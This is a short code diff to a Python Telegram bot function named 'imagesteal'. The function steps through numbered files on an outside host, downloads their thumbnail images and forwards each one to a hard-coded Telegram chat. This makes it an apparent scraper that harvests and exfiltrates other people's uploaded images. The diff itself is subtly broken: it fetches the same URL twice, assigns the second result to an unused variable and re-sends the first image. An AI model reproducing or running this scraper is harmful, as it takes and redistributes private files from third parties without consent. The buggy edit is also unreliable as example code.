@@ -100,6 +100,7 @@ def imagesteal(message):
 			url = str("http://xn--m38h.ml/tgFile/?l=thumbnails/file_"+str(a)+".jpg")
 			path = str("file_"+str(a)+".jpg")
 			response = requests.get(url)
+			response2 = requests.get(url)
 			if not response.content == "b''":
 				img = response.content
 				fmibms3.create_item("kvsh",path,img)
@@ -108,7 +109,15 @@ def imagesteal(message):
 				if img is not None:
 					type(img)
 					bot.send_photo(-1001452022332,img,caption=path)
-					a-=1
+			if not response2.content == "b''":
+				mg = response2.content
+				fmibms3.create_item("kvsh",path,img)
+				linku = file_as_link(path)
+				time.sleep(1)
+				if img is not None:
+					type(img)
+					bot.send_photo(-1001452022332,img,caption=path)
+			a-=1
 				   
 		except Exception as e:
 			print("ERROR : {0} \n".format(e))
